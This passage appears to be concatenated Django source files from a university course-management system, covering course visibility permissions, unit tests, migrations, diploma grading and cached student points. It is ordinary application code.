MessageMixin,\n    ObjectVisibleBasePermission,\n    FilterBackend,\n)\nfrom exercise.cache.points import CachedPoints\nfrom userprofile.models import UserProfile\nfrom .models import (\n    CourseModule,\n    CourseInstance,\n)\n\n\nclass CourseVisiblePermission(ObjectVisibleBasePermission):\n    message = _(\"Permission denied by course visibility\")\n    model = CourseInstance\n    obj_var = 'instance'\n\n    def is_object_visible(self, request, view, course):\n        \"\"\"\n        Find out if CourseInstance is visible to user\n        We expect that AccessModePermission is checked first\n\n         - Always visible to course staff\n         - Always hidden if not open (visible_to_students)\n         - Always visible if public\n         - If not public:\n           - Require authentication\n           - If view_access == enrolled -> visible if student of the course\n           - If enrollment audience external, user should be external\n           - If enrollment audience internal, user should be internal\n        \"\"\"\n        # NOTE: course is actually course instance\n\n        # Course is always visible to staff members\n        if view.is_course_staff:\n            return True\n\n        # Course is not visible if it's hidden\n        if not course.visible_to_students:\n            self.error_msg(_(\"The resource is not currently visible.\"))\n            return False\n\n        user = request.user\n        show_for = course.view_content_to\n        VA = course.VIEW_ACCESS\n\n        # FIXME: we probably should test if access_mode is ANONYMOUS (public), but that\n        # would break api permissiosn (requires get_access_mode)\n        if show_for != VA.PUBLIC:\n            if not user.is_authenticated():\n                self.error_msg(_(\"This course is not open for public.\"))\n                return False\n\n            # Handle enroll views separately\n            if view.get_access_mode() == ACCESS.ENROLL:\n                return self.enrollment_audience_check(request, course, user)\n\n            if show_for == VA.ENROLLED:\n                if not course.is_student(user):\n                    self.error_msg(_(\"Only enrolled students shall pass.\"))\n                    return False\n\n            elif show_for == VA.ENROLLMENT_AUDIENCE:\n                return self.enrollment_audience_check(request, course, user)\n\n        return True\n\n    def enrollment_audience_check(self, request, course, user):\n        audience = course.enrollment_audience\n        external = user.userprofile.is_external\n        EA = course.ENROLLMENT_AUDIENCE\n        if audience == EA.INTERNAL_USERS and external:\n            self.error_msg(_(\"This course is only for internal students.\"))\n            return False\n        elif audience == EA.EXTERNAL_USERS and not external:\n            self.error_msg(_(\"This course is only for external students.\"))\n            return False\n        return True\n\n\nclass EnrollInfoVisiblePermission(ObjectVisibleBasePermission):\n    message = _(\"Permission denied by course visibility\")\n    model = CourseInstance\n    obj_var = 'instance'\n\n    def is_object_visible(self, request, view, course_instance):\n        # Course is always visible to staff members\n        if view.is_course_staff:\n            return True\n\n        # Course is not visible if it's hidden\n        if not course_instance.visible_to_students:\n            self.error_msg(_(\"The resource is not currently visible.\"))\n            return False\n\n        # Only public courses may be browsed without logging in.\n        if course_instance.view_content_to != course_instance.VIEW_ACCESS.PUBLIC \\\n                and not request.user.is_authenticated:\n            self.error_msg(_(\"This course is not open for public.\"))\n            return False\n\n        return True\n\n\nclass CourseModulePermission(MessageMixin, Permission):\n    message = _(\"The module is not currently visible\")\n\n    def has_permission(self, request, view):\n        if not view.is_course_staff:\n            module = view.module\n            return self.has_object_permission(request, view, module)\n        return True\n\n    def has_object_permission(self, request, view, module):\n        if not isinstance(module, CourseModule):\n            return True\n\n        if module.status == CourseModule.STATUS.HIDDEN:\n            return False\n\n        if not module.is_after_open():\n            # FIXME: use format from django settings\n            self.error_msg(\n                _(\"The module will open for submissions at {date}.\"),\n                format={'date': module.opening_time},\n                delim=' ',\n            )\n            return False\n\n        if module.requirements.count() > 0:\n            points = CachedPoints(module.course_instance, request.user, view.content)\n            return module.are_requirements_passed(points)\n        return True\n\n\nclass OnlyCourseTeacherPermission(Permission):\n    message = _(\"Only course teacher is allowed\")\n\n    def has_permission(self, request, view):\n        return self.has_object_permission(request, view, view.instance)\n\n    def has_object_permission(self, request, view, obj):\n        return view.is_teacher or request.user.is_superuser\n\n\nclass OnlyCourseStaffPermission(Permission):\n    message = _(\"Only course staff is allowed\")\n\n    def has_permission(self, request, view):\n        return self.has_object_permission(request, view, view.instance)\n\n    def has_object_permission(self, request, view, obj):\n        return view.is_course_staff or request.user.is_superuser\n\n\nclass IsCourseAdminOrUserObjIsSelf(OnlyCourseStaffPermission, FilterBackend):\n\n    def has_object_permission(self, request, view, obj):\n        if not isinstance(obj, UserProfile):\n            return True\n\n        user = request.user\n        return user and (\n            (user.id is not None and user.id == obj.user_id) or\n            super().has_object_permission(request, view, obj)\n        )\n\n    def filter_queryset(self, request, queryset, view):\n        user = request.user\n        if (\n            issubclass(queryset.model, UserProfile) and\n            not view.is_course_staff and\n            not user.is_superuser\n        ):\n            queryset = queryset.filter(user_id=user.id)\n        return queryset\n/n/n/n/course/tests.py/n/nfrom datetime import timedelta\n\nfrom django.contrib.auth.models import User\nfrom django.core.urlresolvers import reverse\nfrom django.test import TestCase\nfrom django.test.client import Client\nfrom django.utils import timezone\n\nfrom course.models import Course, CourseInstance, CourseHook, CourseModule, \\\n    LearningObjectCategory, StudentGroup\nfrom exercise.models import BaseExercise, Submission\nfrom exercise.exercise_models import LearningObject\n\n\nclass CourseTest(TestCase):\n    def setUp(self):\n        self.client = Client()\n\n        self.user = User(username=\"testUser\")\n        self.user.set_password(\"testPassword\")\n        self.user.save()\n\n        self.grader = User(username=\"grader\", is_staff=True)\n        self.grader.set_password(\"graderPassword\")\n        self.grader.save()\n\n        self.superuser = User(username=\"staff\", is_staff=False, is_superuser=True)\n        self.superuser.set_password(\"staffPassword\")\n        self.superuser.save()\n\n        self.course = Course.objects.create(\n            name=\"test course\",\n            code=\"123456\",\n            url=\"Course-Url\"\n        )\n\n        self.today = timezone.now()\n        self.tomorrow = self.today + timedelta(days=1)\n        self.two_days_from_now = self.tomorrow + timedelta(days=1)\n        self.yesterday = self.today - timedelta(days=1)\n\n        self.past_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 0\",\n            starting_time=self.yesterday,\n            ending_time=self.today,\n            course=self.course,\n            url=\"T-00.1000_d0\"\n        )\n\n        self.current_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 1\",\n            starting_time=self.today,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"T-00.1000_d1\"\n        )\n\n        self.future_course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 2\",\n            starting_time=self.tomorrow,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"T-00.1000_d2\"\n        )\n\n        self.hidden_course_instance = CourseInstance.objects.create(\n            instance_name=\"Secret super course\",\n            starting_time=self.tomorrow,\n            ending_time=self.two_days_from_now,\n            course=self.course,\n            url=\"T-00.1000_hidden\",\n            visible_to_students=False\n        )\n\n        self.course_module = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module\",\n            points_to_pass=10,\n            course_instance=self.current_course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow\n        )\n\n        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module-late\",\n            points_to_pass=50,\n            course_instance=self.current_course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.two_days_from_now,\n            late_submission_penalty=0.2\n        )\n\n        self.learning_object_category = LearningObjectCategory.objects.create(\n            name=\"test category\",\n            course_instance=self.current_course_instance,\n            points_to_pass=5\n        )\n\n        #self.hidden_learning_object_category = LearningObjectCategory.objects.create(\n        #    name=\"hidden category\",\n        #    course_instance=self.current_course_instance\n        #)\n        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)\n\n        self.learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url='l1',\n        )\n\n        self.broken_learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module_with_late_submissions_allowed,\n            category=self.learning_object_category,\n            url='l2',\n        )\n\n        self.base_exercise = BaseExercise.objects.create(\n            name=\"test exercise\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            service_url=\"http://localhost/\",\n            url='b1',\n        )\n\n        self.submission = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.submission.submitters.add(self.user.userprofile)\n\n        self.course_hook = CourseHook.objects.create(\n            hook_url=\"test_hook_url\",\n            course_instance=self.current_course_instance\n        )\n\n    def test_course_instance_open(self):\n        self.assertFalse(self.past_course_instance.is_open())\n        self.assertTrue(self.current_course_instance.is_open())\n        self.assertFalse(self.future_course_instance.is_open())\n\n    def test_course_url(self):\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/\", self.current_course_instance.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_hidden/\", self.hidden_course_instance.get_absolute_url())\n\n    def test_course_staff(self):\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.current_course_instance.assistants.add(self.user.userprofile)\n\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.course.teachers.add(self.user.userprofile)\n\n        self.assertTrue(self.course.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_assistant(self.user))\n        self.assertTrue(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n        self.assertEquals(\"testUser\", self.current_course_instance.get_course_staff_profiles()[0].shortname)\n\n        self.current_course_instance.assistants.clear()\n\n        self.assertTrue(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertTrue(self.current_course_instance.is_teacher(self.user))\n        self.assertTrue(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))\n\n        self.course.teachers.clear()\n\n        self.assertFalse(self.course.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_assistant(self.user))\n        self.assertFalse(self.current_course_instance.is_teacher(self.user))\n        self.assertFalse(self.current_course_instance.is_course_staff(self.user))\n        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))\n\n    def test_course_instance_submitters(self):\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(1, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n\n        submission2 = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile)\n        submission2.submitters.add(self.user.userprofile)\n\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(1, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n\n        submission3 = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.user.userprofile)\n        submission3.submitters.add(self.grader.userprofile)\n\n        students = self.current_course_instance.get_submitted_profiles()\n        self.assertEquals(2, len(students))\n        self.assertEquals(\"testUser\", students[0].shortname)\n        self.assertEquals(\"grader\", students[1].shortname)\n\n    def test_course_instance_visibility(self):\n        self.assertTrue(self.current_course_instance.is_visible_to())\n        self.assertFalse(self.hidden_course_instance.is_visible_to())\n        self.assertTrue(self.current_course_instance.is_visible_to(self.user))\n        self.assertFalse(self.hidden_course_instance.is_visible_to(self.user))\n        self.assertTrue(self.current_course_instance.is_visible_to(self.superuser))\n        self.assertTrue(self.hidden_course_instance.is_visible_to(self.superuser))\n\n    def test_course_instance_get_visible(self):\n        open_course_instances = CourseInstance.objects.get_visible()\n        self.assertEqual(3, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n\n        open_course_instances = CourseInstance.objects.get_visible(self.user)\n        self.assertEqual(3, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n\n        open_course_instances = CourseInstance.objects.get_visible(self.superuser)\n        self.assertEqual(4, len(open_course_instances))\n        self.assertTrue(self.current_course_instance in open_course_instances)\n        self.assertTrue(self.future_course_instance in open_course_instances)\n        self.assertTrue(self.hidden_course_instance in open_course_instances)\n\n    def test_course_instance_unicode_string(self):\n        self.assertEquals(\"123456 test course: Fall 2011 day 1\", str(self.current_course_instance))\n        self.assertEquals(\"123456 test course: Secret super course\", str(self.hidden_course_instance))\n\n    def test_course_hook_unicode_string(self):\n        self.assertEquals(\"123456 test course: Fall 2011 day 1 -> test_hook_url\", str(self.course_hook))\n\n    def test_course_module_late_submission_point_worth(self):\n        self.assertEquals(0, self.course_module.get_late_submission_point_worth())\n        self.assertEquals(80, self.course_module_with_late_submissions_allowed.get_late_submission_point_worth())\n\n    def test_course_module_open(self):\n        self.assertFalse(self.course_module.is_open(self.yesterday))\n        self.assertTrue(self.course_module.is_open(self.today))\n        self.assertTrue(self.course_module.is_open())\n        self.assertTrue(self.course_module.is_open(self.tomorrow))\n        self.assertFalse(self.course_module.is_open(self.two_days_from_now))\n\n    def test_course_module_after_open(self):\n        self.assertFalse(self.course_module.is_after_open(self.yesterday))\n        self.assertTrue(self.course_module.is_after_open(self.today))\n        self.assertTrue(self.course_module.is_after_open())\n        self.assertTrue(self.course_module.is_after_open(self.tomorrow))\n        self.assertTrue(self.course_module.is_after_open(self.two_days_from_now))\n\n    def test_course_views(self):\n        response = self.client.get('/no_course/test', follow=True)\n        self.assertEqual(response.status_code, 404)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertTrue(response.redirect_chain)\n        self.assertEqual(response.status_code, 200)\n        self.assertTemplateUsed(response, 'userprofile/login.html')\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get('/no_course/test', follow=True)\n        self.assertEqual(response.status_code, 404)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n\n        self.assertEqual(response.context[\"course\"], self.course)\n        self.assertEqual(response.context[\"instance\"], self.current_course_instance)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertFalse(response.context[\"is_teacher\"])\n\n        response = self.client.get(self.hidden_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 403)\n\n    def test_course_teacher_views(self):\n        url = self.current_course_instance.get_edit_url()\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n\n        self.current_course_instance.assistants.add(self.grader.userprofile)\n        self.client.login(username=\"grader\", password=\"graderPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n        self.assertTrue(response.context[\"is_assistant\"])\n        self.assertFalse(response.context[\"is_teacher\"])\n\n        self.current_course_instance.assistants.clear()\n        self.course.teachers.add(self.grader.userprofile)\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)\n        self.assertEqual(response.status_code, 200)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertTrue(response.context[\"is_teacher\"])\n\n        self.client.logout()\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"staff\", password=\"staffPassword\")\n        response = self.client.get(url)\n        self.assertEqual(response.status_code, 200)\n        self.assertFalse(response.context[\"is_assistant\"])\n        self.assertTrue(response.context[\"is_teacher\"])\n\n    def test_groups(self):\n        group = StudentGroup(course_instance=self.current_course_instance)\n        group.save()\n        group.members.add(self.user.userprofile,self.grader.userprofile)\n        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,\n            [self.user.userprofile,self.grader.userprofile]), group)\n        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,\n            [self.user.userprofile,self.superuser.userprofile]), None)\n/n/n/n/deviations/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('userprofile', '0002_auto_20150427_1717'),\n    ]\n\n    state_operations = [\n        migrations.CreateModel(\n            name='DeadlineRuleDeviation',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('extra_minutes', models.IntegerField()),\n                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),\n                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='MaxSubmissionsRuleDeviation',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('extra_submissions', models.IntegerField()),\n                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),\n                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='maxsubmissionsruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='deadlineruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n    ]\n    \n    operations = [\n        migrations.SeparateDatabaseAndState(state_operations=state_operations)\n    ]\n/n/n/n/diploma/grade.py/n/nfrom copy import copy\n\n\ndef calculate_grade(total_points, point_limits, pad_points):\n    points = total_points['points']\n    d_points = copy(total_points['points_by_difficulty'])\n\n    def pass_limit(bound):\n        if isinstance(bound, list):\n            ds,ls = zip(*bound)\n            for i,d in enumerate(ds):\n\n                if pad_points:\n                    p = d_points.get(d, 0)\n                    l = ls[i]\n                    if p < l:\n                        for j in range(i + 1, len(ds)):\n                            jd = ds[j]\n                            jp = d_points.get(jd, 0)\n                            if jp > l - p:\n                                d_points[jd] -= l - p\n                                d_points[d] = l\n                                break\n                            else:\n                                p += jp\n                                d_points[d] = p\n                                d_points[jd] = 0\n                    else:\n                        continue\n\n                if d_points.get(d, 0) < ls[i]:\n                    return False\n\n            return True\n        else:\n            return points >= bound\n\n    grade = 0\n    for bound in point_limits:\n        if pass_limit(bound):\n            grade += 1\n        else:\n            break\n    return grade\n\n\ndef assign_grade(cached_points, diploma_design):\n\n    if not (diploma_design and cached_points.user.is_authenticated()):\n        return -1\n\n    if not diploma_design.course.is_course_staff(cached_points.user):\n        avail = diploma_design.availability\n        opt = diploma_design.USERGROUP\n        external = cached_points.user.userprofile.is_external\n        if (\n            (avail == opt.EXTERNAL_USERS and not external)\n            or (avail == opt.INTERNAL_USERS and external)\n        ):\n            return -1\n\n    def is_passed(model):\n        entry,_,_,_ = cached_points.find(model)\n        return entry['passed']\n    if not all(is_passed(m) for m in diploma_design.modules_to_pass.all()):\n        return 0\n    if not all(is_passed(e) for e in diploma_design.exercises_to_pass.all()):\n        return 0\n\n    return calculate_grade(\n        cached_points.total(),\n        diploma_design.point_limits,\n        diploma_design.pad_points\n    )\n/n/n/n/diploma/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.db.models.deletion\nimport diploma.models\nimport lib.models\nimport lib.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0024_auto_20160919_1951'),\n        ('course', '0030_auto_20160912_1341'),\n        ('userprofile', '0003_auto_20160728_1139'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseDiplomaDesign',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('logo', models.ImageField(null=True, blank=True, upload_to=diploma.models.build_upload_dir)),\n                ('title', models.TextField(blank=True)),\n                ('body', models.TextField(blank=True)),\n                ('date', models.CharField(max_length=256)),\n                ('signature_name', models.CharField(blank=True, max_length=256)),\n                ('signature_title', models.CharField(blank=True, max_length=256)),\n                ('small_print', models.TextField(blank=True)),\n                ('point_limits', lib.fields.JSONField(blank=True, help_text='A list of length 5 where each element is the required points for n:th grade.The element can be a list of 2-tuples [[difficulty_level_a, points],[difficulty_level_b, points]].')),\n                ('pad_points', models.BooleanField(help_text='If difficulty levels are used the lower level can be padded with higher level points.', default=False)),\n                ('course', models.OneToOneField(on_delete=django.db.models.deletion.SET_NULL, to='course.CourseInstance', null=True)),\n                ('exercises_to_pass', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),\n                ('modules_to_pass', models.ManyToManyField(blank=True, to='course.CourseModule')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='StudentDiploma',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('created', models.DateTimeField(auto_now=True)),\n                ('hashkey', models.CharField(unique=True, max_length=32)),\n                ('name', models.CharField(max_length=255)),\n                ('grade', models.PositiveIntegerField(default=0)),\n                ('design', models.ForeignKey(to='diploma.CourseDiplomaDesign')),\n                ('profile', models.ForeignKey(on_delete=django.db.models.deletion.SET_NULL, to='userprofile.UserProfile', null=True)),\n            ],\n            options={\n            },\n            bases=(lib.models.UrlMixin, models.Model),\n        ),\n    ]\n/n/n/n/diploma/templatetags/diploma.py/n/nfrom django import template\nfrom django.core.urlresolvers import reverse\n\nfrom exercise.templatetags.exercise import _prepare_context\nfrom ..grade import assign_grade\nfrom ..models import CourseDiplomaDesign\n\n\nregister = template.Library()\n\n\n@register.inclusion_tag(\"diploma/_diploma_button.html\", takes_context=True)\ndef diploma_button(context, student=None):\n    points = _prepare_context(context, student)\n    design = CourseDiplomaDesign.objects.filter(course=points.instance).first()\n    url = None\n    if design and points.user.is_authenticated():\n        url = reverse('diploma-create', kwargs={\n            'coursediploma_id': design.id,\n            'userprofile_id': points.user.userprofile.id,\n        })\n    return {\n        'grade': assign_grade(points, design),\n        'url': url,\n        'is_course_staff': context.get('is_course_staff'),\n    }\n/n/n/n/edit_course/templatetags/editcourse.py/n/nfrom django import template\nfrom django.core.urlresolvers import reverse\n\nfrom course.models import CourseInstance\n\n\nregister = template.Library()\n\n\ndef _normal_kwargs(instance, model_name, **extra_kwargs):\n    kwargs = instance.get_url_kwargs()\n    kwargs.update({\n        \"model\": model_name,\n    })\n    kwargs.update(extra_kwargs)\n    return kwargs\n\n\n@register.filter\ndef editurl(model_object, model_name):\n    return reverse('model-edit', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        id=model_object.id,\n    ))\n\n\n@register.filter\ndef removeurl(model_object, model_name):\n    return reverse('model-remove', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        id=model_object.id,\n    ))\n\n\n@register.filter\ndef createurl(model_object, model_name):\n    type_name = None\n    if \",\" in model_name:\n        model_name, type_name = model_name.split(\",\", 1)\n    if isinstance(model_object, CourseInstance):\n        return reverse('model-create', kwargs=_normal_kwargs(\n            model_object,\n            model_name,\n        ))\n    if type_name:\n        return reverse('model-create-type-for', kwargs=_normal_kwargs(\n            model_object.course_instance,\n            model_name,\n            parent_id=model_object.id,\n            type=type_name,\n        ))\n    return reverse('model-create-for', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        parent_id=model_object.id,\n    ))\n/n/n/n/exercise/cache/points.py/n/nfrom copy import deepcopy\nfrom django.db.models.signals import post_save, post_delete, m2m_changed\nfrom django.utils import timezone\n\nfrom lib.cache import CachedAbstract\nfrom notification.models import Notification\nfrom ..models import LearningObject, Submission\nfrom .hierarchy import ContentMixin\n\n\nclass CachedPoints(ContentMixin, CachedAbstract):\n    KEY_PREFIX = 'points'\n\n    def __init__(self, course_instance, user, content):\n        self.content = content\n        self.instance = course_instance\n        self.user = user\n        super().__init__(course_instance, user)\n\n    def _needs_generation(self, data):\n        return data is None or data['created'] < self.content.created()\n\n    def _generate_data(self, instance, user, data=None):\n        data = deepcopy(self.content.data)\n        module_index = data['module_index']\n        exercise_index = data['exercise_index']\n        modules = data['modules']\n        categories = data['categories']\n        total = data['total']\n\n        # Augment submission parameters.\n        def r_augment(children):\n            for entry in children:\n                if entry['submittable']:\n                    entry.update({\n                        'submission_count': 0,\n                        'submissions': [],\n                        'best_submission': None,\n                        'points': 0,\n                        'passed': entry['points_to_pass'] == 0,\n                        'graded': False,\n                        'unofficial': False,\n                    })\n                r_augment(entry.get('children'))\n        for module in modules:\n            module.update({\n                'submission_count': 0,\n                'points': 0,\n                'points_by_difficulty': {},\n                'unconfirmed_points_by_difficulty': {},\n                'passed': module['points_to_pass'] == 0,\n            })\n            r_augment(module['children'])\n        for entry in categories.values():\n            entry.update({\n                'submission_count': 0,\n                'points': 0,\n                'points_by_difficulty': {},\n                'unconfirmed_points_by_difficulty': {},\n                'passed': entry['points_to_pass'] == 0,\n            })\n        total.update({\n            'submission_count': 0,\n            'points': 0,\n            'points_by_difficulty': {},\n            'unconfirmed_points_by_difficulty': {},\n        })\n\n        # Augment submission data.\n        if user.is_authenticated():\n            submissions = (\n                user.userprofile.submissions.exclude_errors()\n                .filter(exercise__course_module__course_instance=instance)\n                .prefetch_related('exercise')\n                .only('id', 'exercise', 'submission_time', 'status', 'grade')\n            )\n            for submission in submissions:\n                try:\n                    tree = self._by_idx(modules, exercise_index[submission.exercise.id])\n                except KeyError:\n                    self.dirty = True\n                    continue\n                entry = tree[-1]\n                entry['submission_count'] += 1 if not submission.status in (Submission.STATUS.ERROR, Submission.STATUS.UNOFFICIAL) else 0\n                unofficial = submission.status == Submission.STATUS.UNOFFICIAL\n                entry['submissions'].append({\n                    'id': submission.id,\n                    'max_points': entry['max_points'],\n                    'points_to_pass': entry['points_to_pass'],\n                    'confirm_the_level': entry.get('confirm_the_level', False),\n                    'submission_count': 1, # to fool points badge\n                    'points': submission.grade,\n                    'graded': submission.is_graded,\n                    'passed': submission.grade >= entry['points_to_pass'],\n                    'submission_status': submission.status if not submission.is_graded else False,\n                    'unofficial': unofficial,\n                    'date': submission.submission_time,\n                    'url': submission.get_url('submission-plain'),\n                })\n                if (\n                    submission.status == Submission.STATUS.READY and (\n                        entry['unofficial']\n                        or submission.grade >= entry['points']\n                    )\n                ) or (\n                    unofficial and (\n                        not entry['graded']\n                        or (entry['unofficial'] and submission.grade > entry['points'])\n                    )\n                ):\n                    entry.update({\n                        'best_submission': submission.id,\n                        'points': submission.grade,\n                        'passed': not unofficial and submission.grade >= entry['points_to_pass'],\n                        'graded': submission.status == Submission.STATUS.READY,\n                        'unofficial': unofficial,\n                    })\n                if submission.notifications.count() > 0:\n                    entry['notified'] = True\n                    if submission.notifications.filter(seen=False).count() > 0:\n                        entry['unseen'] = True\n\n        # Confirm points.\n        def r_check(parent, children):\n            for entry in children:\n                if (\n                    entry['submittable']\n                    and entry['confirm_the_level']\n                    and entry['passed']\n                ):\n                    if 'unconfirmed' in parent:\n                        del(parent['unconfirmed'])\n                    for child in parent.get('children', []):\n                        if 'unconfirmed' in child:\n                            del(child['unconfirmed'])\n                r_check(entry, entry.get('children', []))\n        for module in modules:\n            r_check(module, module['children'])\n\n        # Collect points and check limits.\n        def add_to(target, entry):\n            target['submission_count'] += entry['submission_count']\n            if entry.get('unofficial', False):\n                pass\n            elif entry.get('unconfirmed', False):\n                self._add_by_difficulty(\n                    target['unconfirmed_points_by_difficulty'],\n                    entry['difficulty'],\n                    entry['points']\n                )\n            else:\n                target['points'] += entry['points']\n                self._add_by_difficulty(\n                    target['points_by_difficulty'],\n                    entry['difficulty'],\n                    entry['points']\n                )\n        def r_collect(module, parent, children):\n            passed = True\n            max_points = 0\n            submissions = 0\n            points = 0\n            confirm_entry = None\n            for entry in children:\n                if entry['submittable']:\n                    if entry['confirm_the_level']:\n                        confirm_entry = entry\n                    else:\n                        passed = passed and entry['passed']\n                        max_points += entry['max_points']\n                        submissions += entry['submission_count']\n                        if entry['graded']:\n                            points += entry['points']\n                            add_to(module, entry)\n                            add_to(categories[entry['category_id']], entry)\n                            add_to(total, entry)\n                passed = (\n                    r_collect(module, entry, entry.get('children', []))\n                    and passed\n                )\n            if confirm_entry and submissions > 0:\n                confirm_entry['confirmable_points'] = True\n            if parent and not parent['submittable']:\n                parent['max_points'] = max_points\n                parent['submission_count'] = submissions\n                parent['points'] = points\n            return passed\n        for module in modules:\n            passed = r_collect(module, None, module['children'])\n            module['passed'] = (\n                passed\n                and module['points'] >= module['points_to_pass']\n            )\n        for category in categories.values():\n            category['passed'] = (\n                category['points'] >= category['points_to_pass']\n            )\n\n        data['points_created'] = timezone.now()\n        return data\n\n    def created(self):\n        return self.data['points_created'], super().created()\n\n    def submission_ids(self, number=None, category_id=None, module_id=None,\n                       exercise_id=None, filter_for_assistant=False, best=True):\n        exercises = self.search_exercises(\n            number=number,\n            category_id=category_id,\n            module_id=module_id,\n            exercise_id=exercise_id,\n            filter_for_assistant=filter_for_assistant,\n        )\n        submissions = []\n        if best:\n            for entry in exercises:\n                sid = entry.get('best_submission', None)\n                if not sid is None:\n                    submissions.append(sid)\n        else:\n            for entry in exercises:\n                submissions.extend(s['id'] for s in entry.get('submissions', []))\n        return submissions\n\n\ndef invalidate_content(sender, instance, **kwargs):\n    course = instance.exercise.course_instance\n    for profile in instance.submitters.all():\n        CachedPoints.invalidate(course, profile.user)\n\ndef invalidate_content_m2m(sender, instance, action, reverse, model, pk_set, **kwargs):\n    # many-to-many field Submission.submitters may be modified without\n    # triggering the Submission post save hook\n    if action not in ('post_add', 'pre_remove'):\n        return\n    if reverse:\n        # instance is a UserProfile\n        